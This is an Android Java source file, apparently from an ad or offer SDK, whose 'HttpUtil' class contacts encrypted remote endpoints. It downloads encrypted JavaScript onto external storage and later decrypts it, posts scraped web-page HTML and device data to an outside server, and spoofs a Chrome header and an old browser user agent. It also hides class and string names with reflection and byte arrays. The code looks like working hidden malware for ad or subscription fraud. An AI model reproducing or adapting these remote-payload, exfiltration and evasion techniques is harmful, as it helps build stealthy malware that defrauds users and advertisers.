package a.d.b.utils;

//import com.crashlytics.android.answers.Answers;
//import com.crashlytics.android.answers.CustomEvent;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import android.webkit.WebSettings;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.GZIPOutputStream;

/**
 * Created by xlc on 2017/5/24.
 */

public class HttpUtil {

    public static final String js_get_source = "javascript:window.myObj.getSource(document.getElementsByTagName('html')[0].innerHTML);";

    // encode.js
    private static final String FileName = "aFZhZBChelLT8iCd42YLmg==";
    //.subscribe
    private static final String FileList = "EBvMsJYPmPkMFwlY7SV3Ng==";
    //.subscribe/encode.js
    private static final String jsName = "9gPKm2k7vPlwIKGykIfMionJ3bwyLyEmkojSywhzoiY=";

    //http://sp.adpushonline.com:7088/sdk_p/a
    public static final String URL_Cache = "iyKe5IXWywHoAEnW2PRGttkZLwbs862pkOaufqRDXbIOxTW49Xj81IyJyOyHXRpY";
    //http://sp.adpushonline.com:7088/sdk_p/b
    public static final String URL_Connect = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1pkzp9kVDmLS7Uq3DzqnhjT";
    //http://sp.adpushonline.com:7088/sdk_p/c
    public static final String URL_Source = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1qnJksyJAVV95v0b4W+KwjJ";
    //http://sp.adpushonline.com:7088/sdk_p/d
    public static final String URL_DownJS = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1r6rh83P8Z66x5IxVBBN5tx";

    public static final String ANALYSIS_URL = "http://track.g2oo.com:89/validate";

    public static final ExecutorService executorService = Executors.newScheduledThreadPool(20);

    /**
     * 联网
     *
     * @param objectMap
     * @param context
     */
    public static synchronized void connect (Map<String, Object> objectMap, Context context) {
        String encodeString = EncodeTool.enCrypt(new JSONObject(objectMap).toString(), JsUtil.getInstance(context).getJs_key());
        if ( !TextUtils.isEmpty(encodeString) ) {
            PrintWriter out = null;
            try {

                URLConnection myConnect = getUrlConnection(EncodeTool.deCrypt(URL_Connect));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encodeString);
                out.flush();

                if ( isSuccessful(myConnect) ) {
                    LogUtil.show("cn succ");
                    //  // Ulog.w("联网: 成功！");
                }
            } catch ( Exception e ) {
                // LogUtil.show("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            } finally {
                try {
                    if ( out != null ) {
                        out.close();
                    }
                } catch ( Exception e ) {
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * 下载
     *
     * @param context
     * @return
     */
    public static boolean post_download_js (Context context) {
        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInfor.getMcc(context));
        JSONObject jsonObject = new JSONObject(map);

        String encode = EncodeTool.enCrypt(jsonObject.toString(), JsUtil.getInstance(context).getJs_key());

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeTool.deCrypt(FileList));
        if ( !file.exists() ) {
            file.mkdirs();
        }

        file = new File(file.getPath(), EncodeTool.deCrypt(FileName));

        // Ulog.w("post_test: encode" + encode);

        if ( !TextUtils.isEmpty(encode) ) {
            PrintWriter out = null;
            //  GZIPInputStream zipInput = null;
            Object zipInput = null;
            FileOutputStream fileOutput = null;

            try {
                URLConnection urlConnect = getUrlConnection(EncodeTool.deCrypt(URL_DownJS));
                out = new PrintWriter(urlConnect.getOutputStream());
                out.print(encode);
                out.flush();

                if ( isSuccessful(urlConnect) ) {
                    //GZIPInputStream
                    String str = new String(new byte[]{71, 90, 73, 80, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109});
                    Class cls = Class.forName("java.util.zip." + str);
                    zipInput = cls.getConstructor(InputStream.class).newInstance(urlConnect.getInputStream());
                    // zipInput = new GZIPInputStream(urlConnect.getInputStream());

                    fileOutput = new FileOutputStream(file);
                    byte[] buffer = new byte[2048];
                    int n;
                    //  while ((n = zipInput.read(buffer)) >= 0) {
                    while ( (n = getDexRead(zipInput, buffer)) >= 0 ) {
                        fileOutput.write(buffer, 0, n);
                    }
                    LogUtil.show("j success");
                }

                JsUtil.getInstance(context).save_download_js_time();

                return true;

            } catch ( Exception e ) {
                e.printStackTrace();

                if ( file.exists() ) {
                    file.delete();
                }
            } finally {
                try {
                    if ( fileOutput != null ) {
                        fileOutput.close();
                    }
                    if ( zipInput != null ) {
                        //  zipInput.close();
                        zipInput.getClass().getMethod("close").invoke(zipInput);
                    }
                    if ( out != null ) {
                        out.close();
                    }
                } catch ( Exception e ) {
                    e.printStackTrace();
                }
            }
        }
        return false;
    }

    private static int getDexRead (Object obj, byte[] org) throws Exception {
        //        zipInput.read(buffer)
        return (int) obj.getClass().getMethod("read", byte[].class).invoke(obj, org);
    }


    /**
     * 直接读取加密的JS文件
     */
    public static String get_encode_js (Context context) {
        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeTool.deCrypt(jsName));
        if ( !file.exists() ) {
            return null;
        }

        FileInputStream fileInputStream = null;
        ByteArrayOutputStream out = null;
        try {
            fileInputStream = new FileInputStream(file);
            out = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int n;
            while ( (n = fileInputStream.read(buffer)) >= 0 ) {
                out.write(buffer, 0, n);
            }

            //解密
            String decode_js_source = EncodeTool.deCrypt(out.toString(), JsUtil.getInstance(context).getJs_key());
            //读取解密后的JS
            //  Ulog.w("post_read_encode_js: 解密后的JS为：" + decode_js_source);
            return decode_js_source;
        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            try {
                if ( fileInputStream != null ) {
                    fileInputStream.close();
                }
                if ( out != null ) {
                    out.close();
                }
            } catch ( IOException e ) {
                e.printStackTrace();
            }
        }
        return null;
    }


    /**
     * 获取Offer
     */
    public static String getCaseData (Context context, Map<String, Object> objectMap) {
        String offer_decode = null;
        JSONObject jsonObject = new JSONObject(objectMap);
        String jsonString = jsonObject.toString();
        String encode = EncodeTool.enCrypt(jsonString, JsUtil.getInstance(context).getJs_key());

        //        Ulog.show("post_test: encode:" + encode);

        if ( !TextUtils.isEmpty(encode) ) {
            PrintWriter out = null;
            InputStream input = null;
            try {

                URLConnection myConnect = getUrlConnection(EncodeTool.deCrypt(URL_Cache, EncodeTool.KEY1));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encode);
                out.flush();

                if ( isSuccessful(myConnect) ) {
                    input = myConnect.getInputStream();
                    StringBuilder strDate = new StringBuilder();
                    byte[] br = new byte[1024];

                    int len = -1;
                    while ( (len = input.read(br)) >= 0 ) {
                        strDate.append(new String(br).substring(0, len));
                    }

                    offer_decode = EncodeTool.deCrypt(strDate.toString(), JsUtil.getInstance(context).getJs_key());
                }
            } catch ( Exception e ) {
                e.printStackTrace();
            } finally {
                try {
                    if ( input != null ) {
                        input.close();
                    }

                    if ( out != null ) {
                        out.close();
                    }
                } catch ( Exception e ) {
                    e.printStackTrace();
                }
            }
        }
        return offer_decode;
    }

    /**
     * 用okhttp 回传源码信息
     *
     * @param message
     */
    public static void postSource (Map<String, Object> message, Context context) {
        //offer_id
        String org = new String(new byte[]{111, 102, 102, 101, 114, 95, 105, 100});
        String offer_id = message.get(org).toString();
        String jsonString = new JSONObject(message).toString();
        //                Ulog.w("postSource:源码总长 " + jsonString.length());
        ByteArrayOutputStream arr = null;
        OutputStream zipper = null;
        PrintWriter out = null;

        try {
            String encode = EncodeTool.enCrypt(jsonString, JsUtil.getInstance(context).getJs_key());

            if ( !TextUtils.isEmpty(encode) ) {
                byte[] data = encode.getBytes("UTF-8");
                arr = new ByteArrayOutputStream();
                zipper = new GZIPOutputStream(arr);
                zipper.write(data);
                zipper.close();

                URLConnection myConnect = getUrlConnection(EncodeTool.deCrypt(URL_Source));
                out = new PrintWriter(myConnect.getOutputStream());
                out.print(arr.toByteArray());
                //                out.flush();
                out.getClass().getMethod("flush").invoke(out);

                if ( isSuccessful(myConnect) ) {
                    XmlShareTool.save(context, offer_id, 1);
                }
            }
        } catch ( Exception e ) {
            e.printStackTrace();
            //   Ulog.show("postSource: fail:" + e.getMessage());
        } finally {
            try {
                if ( out != null ) {
                    out.close();
                }
                if ( arr != null ) {
                    arr.close();
                }
            } catch ( Exception e ) {
                e.printStackTrace();
            }
        }
    }

    public static String postAnalysis (String jsonString, Context context) throws Exception {

        //        LogUtil.w("jsonString:" + jsonString);

        PrintWriter out = null;

        BufferedReader in = null;

        String result = "";

        try {

            URLConnection conn = getUrlConnection(ANALYSIS_URL);
            conn.setRequestProperty("User-Agent", getUserAgent(context));

            out = new PrintWriter(conn.getOutputStream());

            out.print(jsonString);

            out.flush();

            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));

            String line;

            while ( (line = in.readLine()) != null ) {

                result += line;
            }

            return result;

        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            try {
                if ( out != null ) {
                    out.close();
                }
                if ( in != null ) {
                    in.close();
                }
            } catch ( Exception e2 ) {
                e2.printStackTrace();
            }
        }
        return null;

    }

    private static String getUserAgent (Context context) {
        String userAgent = "";
        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 ) {
            try {
                userAgent = WebSettings.getDefaultUserAgent(context);
            } catch ( Exception e ) {
                userAgent = System.getProperty("http.agent");
            }
        } else {
            userAgent = System.getProperty("http.agent");
        }
        StringBuffer sb = new StringBuffer();
        for ( int i = 0, length = userAgent.length(); i < length; i++ ) {
            char c = userAgent.charAt(i);
            if ( c <= '\u001f' || c >= '\u007f' ) {
                sb.append(String.format("\\u%04x", (int) c));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }


    public static URLConnection getUrlConnection (String url) {
        try {
            URLConnection conn = new URL(url).openConnection();
            conn.setConnectTimeout(15000);
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.1;SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            return conn;
        } catch ( Exception e ) {
            e.printStackTrace();
        }
        return null;
    }

    private static boolean isSuccessful (URLConnection urlConnect) throws IOException {
        int code = ((HttpURLConnection) urlConnect).getResponseCode();
        if ( code >= 200 && code < 300 ) {
            return true;
        }
        return false;
    }

    //X-Requested-With
    public static final String HeadKey = "1/dbJVQWYv4PDw+zrdYUrl3tLfOw1dkU7Zm1unBcbFE=";
    //com.android.chrome
    public static final String HeadValue = "eUMSys/9KSx8Uw0KFAx1KTszIgpbHcyUWJRK5DOZT7c=";

    public static Map<String, String> getWebHead () {
        Map<String, String> header = new HashMap<>();
        header.put(EncodeTool.deCrypt(HeadKey), EncodeTool.deCrypt(HeadValue));//默认是应用包名
        return header;
    }
}